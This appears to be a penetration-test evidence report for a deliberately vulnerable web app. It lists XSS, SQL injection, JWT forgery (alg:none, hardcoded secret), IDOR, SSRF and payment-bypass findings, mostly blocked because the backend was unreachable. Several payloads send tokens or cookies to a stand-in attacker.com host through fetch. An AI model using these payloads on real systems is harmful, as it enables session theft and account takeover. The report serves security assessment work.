- **Vulnerable location:** POST /api/files/upload (multipart field: `filename`) → GET /api/files/project/:id → ProjectDetails.jsx href attribute
- **Overview:** When a file is uploaded, the original filename is preserved without sanitization. The filename is stored in the database and later concatenated directly into an `<a>` element's `href` attribute on the project details page. An attacker can upload a file with a crafted filename containing quote characters (`">`) to break out of the href attribute and inject HTML/script content into the page.
- **Impact:** Arbitrary HTML injection into the project details page. With a crafted filename, the attacker can inject a `<script>` tag or event handlers that execute JavaScript when the page renders.
- **Severity:** High (medium confidence — actual script execution depends on backend Content-Type headers)

**Prerequisites:**
- Express.js backend running at `http://localhost:5001`
- Valid JWT Bearer token
- Ability to upload files (authenticated access to project)

**Backend — routes/files.js:9-17 (filename injection confirmed):**
```javascript
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    // VULNERABILITY: Keep original name (allowing .js, .html, etc.)
    cb(null, file.originalname);  // ← Original filename preserved raw
  }
});
```

No sanitization of `file.originalname`. If a file is uploaded with name `"><script>alert(1)>.txt`, the filename is stored and returned as-is.

**Frontend — src/pages/ProjectDetails.jsx:107-110:**
```jsx
<a href={`http://localhost:5001/uploads/${f.filename}`}  // ← Filename in href
  target="_blank" rel="noreferrer" style={{ color: 'var(--text-secondary)' }}>
  <Download size={18} />
</a>
```

If `f.filename` is `"><img src=x onerror=alert(1)>.txt`, the rendered HTML is:
```html
<a href="http://localhost:5001/uploads/"><img src=x onerror=alert(1)>.txt"
  target="_blank" rel="noreferrer" download>
  <Download size={18} />
</a>
```

The `">` closes the href attribute and injects an `<img>` tag into the page body. The `onerror` handler executes when the browser attempts to load the non-existent image `x`.

**What We Tried:**

1. Attempted to upload a file via the project details page file upload interface.
   - **Result:** Upload fails — `http://localhost:5001/api/files/upload` unreachable

2. Attempted to verify filename rendering by examining the ProjectDetails page source.
   - **Result:** Page loads but API calls fail, files list empty

**How This Would Be Exploited:**

**Step 1 — Upload file with crafted filename:**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Create a file with a malicious filename
# Filename: ">"><img src=x onerror=fetch('https://attacker.com/f?c='+localStorage.token)>.txt
PAYLOAD='"><img src=x onerror=fetch("https://attacker.com/f?c="+localStorage.token)>.txt'

# Create the file
echo "malicious content" > "$PAYLOAD"

# Upload the file to a project (project ID 5)
curl -s -X POST http://localhost:5001/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$PAYLOAD" \
  -F "project_id=5"
# Response: { "id": 12, "filename": ">"><img src=x onerror=...>.txt", ... }
```

**Step 2 — Victim views project files:**
When any user visits `https://techviflaw.vn.gd/project/5`:
1. Page loads project files via `GET /api/files/project/5`
2. Files list is rendered with the malicious filename in the href
3. The `">` breaks out of the href attribute
4. The injected `<img>` tag is rendered in the page body
5. Browser attempts to load `x` as an image, fails, and fires `onerror`
6. `fetch('https://attacker.com/f?c='+localStorage.token)` executes
7. JWT exfiltrated to attacker-controlled domain

**Alternative: Script injection via filename:**
```bash
# Upload with filename that injects a <script> tag
PAYLOAD='"><script>fetch("https://attacker.com/s?d="+document.cookie)</script><a href="x'

echo "dummy" > "$PAYLOAD"
curl -X POST http://localhost:5001/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@$PAYLOAD" \
  -F "project_id=5"
```

Rendered HTML:
```html
<a href="http://localhost:5001/uploads/"><script>fetch("https://attacker.com/s?d="+document.cookie)</script><a href="x"
  target="_blank" rel="noreferrer" download>
  <Download size={18} />
</a>
```

**Notes:**
- No file extension validation exists — `.js` and `.html` files can be uploaded
- The `download` attribute on the `<a>` tag does not prevent HTML/script injection
- If the backend serves files with `Content-Type: text/javascript` or `Content-Type: text/html`, uploaded `.js` or `.html` files could also be executed directly via the file URL
- Confidence is MEDIUM because actual script execution depends on Content-Type header behavior

---

# Authentication Exploitation Evidence Report

**Target:** https://techviflaw.vn.gd
**Scope:** External network — exploitation against https://techviflaw.vn.gd only
**Exploitation Status:** ALL 11 vulnerabilities blocked by backend inaccessibility
**Framework:** React 18 (Vite) frontend on Cloudflare Pages / Express.js backend on localhost:5001

---

### AUTH-VULN-01: SQL Injection → Credential Extraction

**Vulnerable location:** `GET /api/projects/search/name?name=` — `routes/projects.js:29`

**Vulnerability confirmed via:** Source code analysis of `/repos/VulApp/backend/routes/projects.js:26-36` — direct string interpolation into SQL query with no parameterization.

**Current blocker:** Backend server at `localhost:5001` is unreachable (ERR_CONNECTION_REFUSED). No API calls can be made.

**How this would be exploited if backend were reachable:**

1. Authenticate as any user (or use unsigned JWT via `alg: "none"` bypass)
2. Send SQL injection payload via project search:
   ```
   GET /api/projects/search/name?name=' UNION SELECT id, email, password FROM users--
   ```
3. Backend executes: `SELECT * FROM projects WHERE name LIKE '%' UNION SELECT id, email, password FROM users--%'`
4. Response contains all users with plaintext passwords
5. Use extracted credentials to log in as any user (including admin)

**Expected impact:** Complete credential compromise — all user passwords (stored in plaintext per `db.js:12`) are extracted in a single request.

---

### AUTH-VULN-02: Predictable Password Reset Token → Account Takeover

**Vulnerable location:** `POST /api/auth/forgot-password` — `routes/auth.js:86`

**Vulnerability confirmed via:** Source code analysis — token is `Buffer.from(`${email}:${Date.now()}`).toString('base64')`, leaked in `debug_token` response field, has no expiration or one-time-use enforcement in reset handler.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

1. Send `POST /api/auth/forgot-password` with victim's email → receive `debug_token: base64(email:timestamp)`
2. Calculate approximate timestamp window around request time
3. Compute `base64(victim_email:timestamp)` for each timestamp in window
4. Send `POST /api/auth/reset-password` with correct token and new password
5. Account takeover complete — victim's password is now set to attacker's value

**Expected impact:** Complete account takeover of any user without knowing their password.

---

### AUTH-VULN-03: JWT Signed with Hardcoded Secret → Full Impersonation

**Vulnerable location:** `middleware/auth.js:4` — `const JWT_SECRET = 'secret123'`

**Vulnerability confirmed via:** Source code — JWT secret is literally `'secret123'`. Tokens have no expiration (`jwt.sign()` with no `expiresIn`). Middleware accepts `alg: "none"` unsigned tokens.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

**Approach A — No backend needed (unsigned token):**
```
jwt_payload = base64url({"alg":"none","typ":"JWT"}) + "." +
              base64url('{"id":1,"email":"test@example.com","plan":"admin"}') + "."
POST /api/projects with Authorization: Bearer <above>
```

**Approach B — Sign with known secret:**
```
jwt.sign({ id: 1, email: 'test@example.com', plan: 'admin' }, 'secret123')
→ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwicGxhbiI6ImFkbWluIn0.<signature>
```

**Expected impact:** Persistent, never-expiring, irrevocable privileged access. Attacker can impersonate any user including administrators.

---

### AUTH-VULN-04: Debug Endpoint Exposes JWT Secret

**Vulnerable location:** `GET /api/debug` — `routes/debug.js:8-18`

**Vulnerability confirmed via:** Source code — `res.json({ config: { jwt_secret: JWT_SECRET } })` — returns JWT secret with no authentication.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

1. `GET /api/debug` → response contains `"jwt_secret": "secret123"`
2. Forge JWT token for any user using this secret
3. Full account takeover

**Expected impact:** JWT secret exposure enables complete token forgery for all users.

---

### AUTH-VULN-05: Admin Panel Bypass via Query Parameter

**Vulnerable location:** `GET /api/admin?admin=true` — `routes/debug.js:34-52`

**Vulnerability confirmed via:** Source code — `if (admin === 'true')` check is the only gate. No authentication. Returns `SELECT * FROM users` including plaintext passwords.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

```
GET /api/admin?admin=true
→ Response: { "total_users": N, "users": [{ "id": 1, "email": "test@example.com", "password": "123456", ... }, ...] }
```

**Expected impact:** Complete dump of all user credentials. Every user account can be taken over immediately.

---

### AUTH-VULN-06: /api/docs Exposes Test Credentials and JWT Token

**Vulnerable location:** `GET /api/docs` — `server.js:37-71`

**Vulnerability confirmed via:** Source code — returns `test_credentials: { email: 'test@example.com', password: '123456' }` and pre-generated `example_jwt` without authentication.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

```
GET /api/docs
→ { "test_credentials": { "email": "test@example.com", "password": "123456" },
    "example_jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwicGxhbiI6ImZyZWUifQ" }
```

Use credentials to log in or inject the pre-generated JWT directly:
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwicGxhbiI6ImZyZWUifQ
```

**Expected impact:** Immediate access as `test@example.com` (pre-seeded user).

---

### AUTH-VULN-07: No Rate Limiting on Login → Brute Force

**Vulnerable location:** `POST /api/auth/login` — `routes/auth.js:29`

**Vulnerability confirmed via:** Source code — No rate limiting middleware exists anywhere in `server.js` or `routes/auth.js`. Passwords are stored in plaintext and compared directly with `password = ?` — no hashing, no bcrypt.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

1. Identify target email (via registration enumeration: different response for existing vs new email)
2. Script loops through password candidates:
   ```
   POST /api/auth/login { "email": "test@example.com", "password": "password123" }
   POST /api/auth/login { "email": "test@example.com", "password": "123456" }
   POST /api/auth/login { "email": "test@example.com", "password": "admin" }
   ... (unlimited attempts, no lockout, no delay)
   ```
3. Successful login returns JWT token with no rate limit triggered

**Expected impact:** Efficient credential brute-forcing against any account. Combined with weak default credentials (`test@example.com / 123456`), trivial account compromise.

---

### AUTH-VULN-08: Mass Account Creation Without Rate Limiting

**Vulnerable location:** `POST /api/auth/register` — `routes/auth.js:9`

**Vulnerability confirmed via:** Source code — No rate limiting, no CAPTCHA, no email verification. `db.run(INSERT INTO users...)` is executed directly.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

```
POST /api/auth/register { "email": "user1@attacker.com", "password": "Aa1!aaaa" }
POST /api/auth/register { "email": "user2@attacker.com", "password": "Aa1!aaaa" }
POST /api/auth/register { "email": "user3@attacker.com", "password": "Aa1!aaaa" }
... (unlimited, no rate limit)
```

**Expected impact:** Mass account creation for spam campaigns, resource exhaustion, or to support subsequent attacks using created accounts.

---

### AUTH-VULN-09: JWT in localStorage → XSS Session Hijacking

**Vulnerable location:** `Login.jsx:15` — `localStorage.setItem('token', ...)`; `api.js:9` — Bearer token sent on all requests

**Vulnerability confirmed via:** Source code — Token stored in localStorage (JavaScript-accessible, no HttpOnly flag). Stored XSS exists in project descriptions rendered with `dangerouslySetInnerHTML`.

**Current blocker:** Backend server unreachable (no token can be obtained without backend, and stored XSS cannot be planted without backend API access).

**How this would be exploited if backend were reachable:**

1. Create a project with description: `<script>fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))</script>`
2. Any user viewing the project dashboard triggers the XSS
3. Attacker's server receives the stolen JWT token
4. Attacker uses token: `Authorization: Bearer <stolen_token>`
5. Persistent access maintained indefinitely — tokens never expire, no server-side revocation

**Expected impact:** Complete session hijacking. Attacker impersonates victim indefinitely with no expiration and no way for the victim to invalidate the session.

---

### AUTH-VULN-10: Mass Assignment on Profile Update → Privilege Escalation

**Vulnerable location:** `PUT /api/auth/profile` — `routes/auth.js:60-67`

**Vulnerability confirmed via:** Source code — `const fields = Object.keys(req.body).map(k => \`${k} = ?\`).join(', ')` accepts ALL body fields. No allowlist, no blocklist.

**Current blocker:** Backend server unreachable (requires valid JWT to reach authenticated endpoint).

**How this would be exploited if backend were reachable:**

```
PUT /api/auth/profile
Authorization: Bearer <attacker_jwt>
{
  "plan_type": "admin",
  "password": "KnownPassword123!"
}
→ Response: { "message": "Profile updated", "updatedFields": ["plan_type", "password"] }
```

**Expected impact:** Vertical privilege escalation to admin + persistent access with known password. No server-side authorization check prevents arbitrary field modification.

---

### AUTH-VULN-11: CORS Wildcard + Missing Security Headers → Cross-Origin Attacks

**Vulnerable location:** `server.js:11` — `app.use(cors({ origin: '*' }))`

**Vulnerability confirmed via:** Source code — CORS wildcard allows any external origin. No `Access-Control-Allow-Credentials` restrictive configuration. No security headers on any response. No `Cache-Control: no-store` on auth responses.

**Current blocker:** Backend server unreachable.

**How this would be exploited if backend were reachable:**

Attacker hosts malicious page at `https://attacker.com/evil.html`:
```html
<script>
fetch('http://localhost:5001/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'test@example.com', password: '123456' })
})
.then(r => r.json())
.then(data => {
  // Token stolen — victim's session hijacked
  fetch('https://attacker.com/log?token=' + data.token);
});
</script>
```

**Expected impact:** Any website the victim visits can make authenticated requests on their behalf. Combined with localStorage tokens and no CSRF protection, full account takeover via cross-origin attacks.

---

# SSRF Exploitation Evidence

**Target:** https://techviflaw.vn.gd
**Exploitation Phase:** SSRF Specialist
**Vulnerabilities Assessed:** 1 (from `deliverables/ssrf_exploitation_queue.json`)

---

### SSRF-VULN-01: GET /api/fetch-url — Internal Network Required

**Summary:**
- **Vulnerable location:** `GET /api/fetch-url?url=` — `routes/debug.js:21-32`
- **Impact:** Unable to assess from external network — backend server runs on `localhost:5001` (loopback interface only)
- **Severity:** N/A — Internal network access required

**Prerequisites:**
- None achievable externally

**Exploitation Steps:**

**Step 1: Verify Frontend Architecture**
Navigated browser to `https://techviflaw.vn.gd` to confirm application structure.

Result: React SPA served by Cloudflare Pages. Console errors confirmed:
```
[ERROR] AxiosError: Network Error @ http://localhost:5001/api/projects:0
[ERROR] Failed to load resource: net::ERR_CONNECTION_REFUSED
```

The browser is unable to reach `localhost:5001` — the backend is not reachable from the browser's perspective.

**Step 2: Test External Access to SSRF Endpoint**
Attempted direct navigation to `https://techviflaw.vn.gd/api/fetch-url?url=http://example.com`.

Result: Page loaded the React SPA. Console showed:
```
[WARNING] No routes matched location "/api/fetch-url"
```

The `/api/fetch-url` path falls through to React Router (client-side routing). No request reaches the Express backend.

**Step 3: Verify Backend is Localhost-Only**
Attempted `http://localhost:5001/api/fetch-url?url=http://example.com` from browser context.

Result:
```
Error: net::ERR_CONNECTION_REFUSED at http://localhost:5001/api/fetch-url
```

`localhost:5001` is unreachable — confirmed backend is loopback-only.

**Step 4: Verify Backend Not Exposed on External IP**
Attempted `http://45.33.32.156:5001/api/fetch-url?url=http://example.com` (the server's detected external IP).

Result:
```
Error: net::ERR_CONNECTION_REFUSED at http://45.33.32.156:5001/api/fetch-url
```

Backend is not bound to any externally accessible interface.

**Step 5: Confirm No Server-Side Proxy**
Attempted `https://techviflaw.vn.gd/api/debug`, `https://techviflaw.vn.gd/api/projects` — both returned React SPA with "No routes matched" warning.

All `/api/*` paths are handled by the React SPA's client-side router, not by any server-side proxy to the Express backend.

**Step 6: Verify Source Code Confirms Architecture**
Reviewed `server.js:86-88`:
```javascript
app.listen(PORT, () => {
  console.log(`VulApp Backend running on port ${PORT}`);
});
```

`PORT` defaults to `5001` with no explicit host binding. No `app.listen(PORT, '0.0.0.0')` — defaults to loopback.

Reviewed `src/services/api.js`:
```javascript
const api = axios.create({ baseURL: 'http://localhost:5001/api' });
```

The frontend hardcodes `http://localhost:5001/api` — confirming the backend is designed for localhost access only.

**Proof of Network Inaccessibility:**

| Test | URL | Result |
|------|-----|--------|
| Browser → Frontend | `https://techviflaw.vn.gd/api/fetch-url?url=http://example.com` | React SPA (client-side routing) — no backend hit |
| Browser → Backend (localhost) | `http://localhost:5001/api/fetch-url` | `ERR_CONNECTION_REFUSED` |
| Browser → Backend (external IP) | `http://45.33.32.156:5001/api/fetch-url` | `ERR_CONNECTION_REFUSED` |
| Frontend console errors | Browser DevTools on `https://techviflaw.vn.gd` | `net::ERR_CONNECTION_REFUSED` at `localhost:5001` |

**Root Cause of Inaccessibility:**
The application uses a split architecture:
- **Frontend:** Static React SPA hosted on Cloudflare Pages at `https://techviflaw.vn.gd`
- **Backend:** Express.js server running on `localhost:5001` (loopback only)

The browser makes direct AJAX calls to `http://localhost:5001/api` — this only works when the browser is on the same machine as the backend server. From any external network location (including this assessment environment), `localhost:5001` is unreachable.

**Vulnerability Assessment:**

The SSRF code vulnerability is **confirmed present** in the codebase:
```javascript
// routes/debug.js:21-32 — No URL validation whatsoever
router.get('/fetch-url', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'URL is required' });
  try {
    console.log(`Fetching URL (SSRF): ${url}`);
    const response = await axios.get(url); // ← No sanitization, no allowlist
    res.send(response.data);
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch URL', message: err.message });
  }
});
```

The vulnerability is **real** and would be critical if the backend were exposed. However, the backend is not reachable from the external network, making SSRF exploitation impossible from this testing context.

**Note:** The injection testing phase had direct backend access (via `host.docker.internal:5001`) and confirmed SSRF — internal chaining to `http://localhost:5001/api/admin?admin=true` returned all 4 user accounts with plaintext passwords. The vulnerability is confirmed; only the external exploitation path is blocked.

---

# Authorization Exploitation Evidence

**Test Target:** https://techviflaw.vn.gd
**Exploitation Period:** 2026-03-21
**Testers:** Authorization Exploitation Specialist

**Scope Constraint Encountered:** ALL 10 authorization vulnerabilities in the exploitation queue require access to the Express.js backend API server running at `http://localhost:5001`. This backend is inaccessible from the external network testing environment. Every exploitation attempt was blocked before a single request could be sent to the target API.

---

### AUTHZ-VULN-01: Mass Assignment — PUT /api/auth/profile

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/auth.js:57-73`):**
```javascript
router.put('/profile', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  // VULNERABILITY: Accepting ALL fields from request body
  const updates = req.body;
  const fields = Object.keys(updates).map(k => `${k} = ?`).join(', ');
  const values = Object.values(updates);
  if (!fields) return res.status(400).json({ error: 'No fields to update' });
  const query = `UPDATE users SET ${fields} WHERE id = ?`;
  db.run(query, [...values, req.user.id], function(err) { ... });
});
```

**Attack Payload:**
```
PUT http://localhost:5001/api/auth/profile
Authorization: Bearer <JWT>
Content-Type: application/json

{"plan_type": "enterprise"}
```

**Expected Impact:** Any authenticated user can escalate their plan from 'free' to 'enterprise' without payment. The `plan_type` field is stored directly in the database without validation against the JWT claim.

**External Testing Attempt:**
- Navigated to https://techviflaw.vn.gd/register — React Router caught route
- Submitted registration form — `ERR_CONNECTION_REFUSED` on `http://localhost:5001/api/auth/register`
- No requests reached the backend; all were blocked by network-level connectivity failure

**Why Internal Access Is Required:** The Express.js backend is only reachable from within the Docker network (`ports: "5001:5001"` maps to localhost inside the container). No Cloudflare proxy or public endpoint forwards requests to it.

---

### AUTHZ-VULN-02: IDOR (Read) — GET /api/projects/:id

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/projects.js:15-22`):**
```javascript
router.get('/:id', (req, res) => {
  const projectId = req.params.id;
  // Missing check: if (project.owner_id !== req.user.id && !project.is_public)
  db.get(`SELECT * FROM projects WHERE id = ?`, [projectId], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Project not found' });
    res.json(row); // Returns ALL project details including owner_id, description
  });
});
```

**Attack Payload:**
```
GET http://localhost:5001/api/projects/1
Authorization: Bearer <JWT>
```

**Expected Impact:** Any authenticated user can read the name, description (potentially containing XSS payloads), owner_id, and privacy status of ANY project in the database, including private projects belonging to other users.

**External Testing Attempt:**
- Browser console shows `net::ERR_CONNECTION_REFUSED` on all `localhost:5001` requests
- No requests reached the Express server

---

### AUTHZ-VULN-03: IDOR (Modify) — PUT /api/projects/:id

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/projects.js:89-100`):**
```javascript
router.put('/:id', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  const { name, description, is_public } = req.body;
  // VULNERABILITY: No ownership check
  db.run(`UPDATE projects SET name = ?, description = ?, is_public = ? WHERE id = ?`,
    [name, description, is_public ? 1 : 0, req.params.id], function(err) { ... });
});
```

**Attack Payload:**
```
PUT http://localhost:5001/api/projects/1
Authorization: Bearer <JWT>
Content-Type: application/json

{"is_public": 1}
```

**Expected Impact:** Any authenticated user can modify ANY project's name, description, and privacy setting. A private project can be made public, exposing its contents to all users. Descriptions are rendered with `dangerouslySetInnerHTML`, allowing stored XSS.

---

### AUTHZ-VULN-04: IDOR (Delete) — DELETE /api/projects/:id

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/projects.js:53-59`):**
```javascript
router.delete('/:id', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  // Missing ownership check
  db.run(`DELETE FROM projects WHERE id = ?`, [req.params.id], function(err) { ... });
});
```

**Attack Payload:**
```
DELETE http://localhost:5001/api/projects/1
Authorization: Bearer <JWT>
```

**Expected Impact:** Any authenticated user can permanently delete ANY project in the database, regardless of ownership. Complete data destruction without authorization check.

---

### AUTHZ-VULN-05: IDOR (File Listing) — GET /api/files/project/:id

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/files.js:39-44`):**
```javascript
router.get('/project/:id', (req, res) => {
  const projectId = req.params.id;
  // No authentication check, no ownership check
  db.all(`SELECT * FROM files WHERE project_id = ?`, [projectId], (err, rows) => {
    res.json(rows); // Returns all files with filename, filepath metadata
  });
});
```

**Attack Payload:**
```
GET http://localhost:5001/api/files/project/1
(no Authorization header required — endpoint has no auth check)
```

**Expected Impact:** Any user (even unauthenticated via JWT none bypass) can enumerate all files attached to any project, exposing filenames and server-side file paths.

---

### AUTHZ-VULN-06: Vertical (Admin Panel Bypass) — GET /api/admin

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/debug.js:35-51`):**
```javascript
router.get('/admin', (req, res) => {
  const { admin } = req.query;
  // VULNERABILITY: Weak protection (query param)
  if (admin === 'true') {
    const db = require('../db');
    db.all(`SELECT * FROM users`, (err, users) => {
      res.json({
        message: 'Welcome to the Admin Panel!',
        total_users: users.length,
        users: users // LEAKS plaintext passwords
      });
    });
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});
```

**Attack Payload:**
```
GET http://localhost:5001/api/admin?admin=true
(no Authorization header required)
```

**Expected Impact:** Any unauthenticated internet user can dump the complete user table including plaintext passwords. Full account takeover of all users possible by logging in with dumped credentials.

---

### AUTHZ-VULN-07: Vertical (Subscribe Bypass) — POST /api/subscribe

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/payment.js:6-14`):**
```javascript
router.post('/', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  const { plan_type } = req.body;
  // VULNERABILITY: Directly setting plan_type without payment validation
  db.run(`UPDATE users SET plan_type = ? WHERE id = ?`, [plan_type, req.user.id],
    function(err) { ... });
});
```

**Attack Payload:**
```
POST http://localhost:5001/api/subscribe
Authorization: Bearer <JWT>
Content-Type: application/json

{"plan_type": "enterprise"}
```

**Expected Impact:** Any authenticated user can set their plan to 'enterprise' without any payment, bypassing the entire billing workflow. The `plan_type` value is stored directly in the database with no verification.

---

### AUTHZ-VULN-08: Vertical (JWT Secret Exposure) — GET /api/debug

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/debug.js:8-18`):**
```javascript
router.get('/debug', (req, res) => {
  res.json({
    message: 'Debug information',
    config: {
      db_type: 'sqlite',
      db_path: path.resolve(__dirname, '../database.sqlite'),
      jwt_secret: JWT_SECRET // VULNERABILITY: leaks JWT secret
    },
    system: process.env
  });
});
```

**Attack Payload:**
```
GET http://localhost:5001/api/debug
(no Authorization header required)
```

**Expected Response:**
```json
{
  "message": "Debug information",
  "config": {
    "db_type": "sqlite",
    "db_path": ".../backend/database.sqlite",
    "jwt_secret": "secret123"
  }
}
```

**Expected Impact:** Unauthenticated attackers obtain the hardcoded JWT signing secret ('secret123'), database type, database path, and full process environment variables. With the secret, attackers can forge arbitrary JWTs with any identity and plan_type, enabling full authentication bypass.

**External Testing Attempt:**
- Navigated to https://techviflaw.vn.gd/api/debug — React Router served SPA shell
- Browser console: `No routes matched location "/api/debug"`
- No request reached the backend server

---

### AUTHZ-VULN-09: Vertical (JWT None Algorithm Bypass) — All /api/* routes

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/middleware/auth.js:6-42`):**
```javascript
const authenticate = (req, res, next) => {
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return next(); // Proceed as anonymous

  // VULNERABILITY: JWT NONE ALGORITHM BYPASS
  try {
    const parts = token.split('.');
    if (parts.length >= 2) {
      const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
      if (header.alg === 'none' || header.alg === 'None') {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        console.log(`[VULN] Accepted unsigned JWT for user: ${payload.email}`);
        req.user = payload; // Trusts forged payload completely
        return next();
      }
    }
  } catch (e) { /* Fall through */ }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};
```

**Forged Token Construction:**
```javascript
// Create unsigned JWT with any identity:
const header = Buffer.from(JSON.stringify({alg:"none",typ:"JWT"})).toString('base64');
const payload = Buffer.from(JSON.stringify({id:999,email:"admin@techviflaw.vn.gd",plan:"enterprise"})).toString('base64');
const forgedToken = `${header}.${payload}.`; // empty signature

// Use as:
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwZSI6IldSVFdpdGhNZXRhZGF0YSJ9.eyJpZCI6OTk5LCJlbWFpbCI6ImFkbWluQHRlY2h2aWZsYXcudm4uZ2QiLCJwbGFuIjoiZW50ZXJwcmlzZSJ9.
```

**Expected Impact:** Any unauthenticated internet user can forge a valid JWT with any user ID, email, and plan_type without knowing the secret. This bypasses authentication entirely and enables identity impersonation (horizontal escalation) and privilege escalation (vertical escalation) across all routes.

**External Testing Attempt:**
- No request reached the backend to test the algorithm bypass
- The vulnerability is confirmed via source code analysis

---

### AUTHZ-VULN-10: Context_Workflow (Payment Flow Bypass) — POST /api/subscribe

**Classification:** INTERNAL_NETWORK_ACCESS_REQUIRED
**Blocking Factor:** Backend server at localhost:5001 unreachable from external network.
**Exploitation Would Require:** Network access to http://localhost:5001

**Vulnerability Evidence (Source Code — `/repos/VulApp/backend/routes/payment.js:6-14`):**
```javascript
router.post('/', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  const { plan_type } = req.body;
  // VULNERABILITY: No prior state validation, no payment initiation, no webhook
  db.run(`UPDATE users SET plan_type = ? WHERE id = ?`, [plan_type, req.user.id], ...);
});
```

**Attack Payload:**
```
POST http://localhost:5001/api/subscribe
Authorization: Bearer <JWT>
Content-Type: application/json

{"plan_type": "enterprise"}
```

**Expected Impact:** The subscribe endpoint assumes payment was completed but validates no prior state (no payment intent, no session token, no webhook confirmation). Users can set plan to 'enterprise' instantly without any payment workflow. This bypasses the entire billing process — no invoice, no charge, no subscription management.

**External Testing Attempt:**
- Backend unreachable — no requests could be sent

---
